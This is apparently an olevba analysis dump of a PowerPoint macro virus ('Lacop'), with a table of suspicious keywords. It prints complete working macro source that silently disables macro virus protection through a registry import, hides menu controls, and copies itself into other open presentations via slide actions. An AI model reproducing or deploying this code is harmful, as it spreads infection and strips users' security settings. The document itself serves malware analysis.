olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSPPoint.Lacop.ppt
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO LACOPHRONE.bas 
in file: Virus.MSPPoint.Lacop.ppt - OLE stream: 'VBA/LACOPHRONE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub LACO()
On Error Resume Next
With ActivePresentation.VBProject.VBComponents("LACOPHRONE")
.Export ("C:\CONFIG.LAC")
End With

With CommandBars("Tools")
.Controls("Macro").Enabled = 0
.Controls("Customize...").Enabled = 0
End With
Open "c:\power.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options]"
Print #1, """MacroVirusProtection""=dword:00000000"
Close 1
Shell "regedit /s c:\power.reg", vbHide
For i = 1 To Presentations.Count
If Presentations(i).VBProject.VBComponents(1).Name <> "LACOPHRONE" Then
With Presentations(i).VBProject.VBComponents
.Import("C:\CONFIG.LAC").Name = "LACOPHRONE"
End With
End If
Next
For Each kilo In ActivePresentation.Slides(ActivePresentation.Slides.Count).Shapes
With kilo.ActionSettings(ppMouseOver)
.Action = ppActionRunMacro
.Run "LACOPHRONE"
End With
With kilo.ActionSettings(ppMouseClick)
.Action = ppActionRunMacro
.Run "LACOPHRONE"
End With
Next
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |power.reg           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

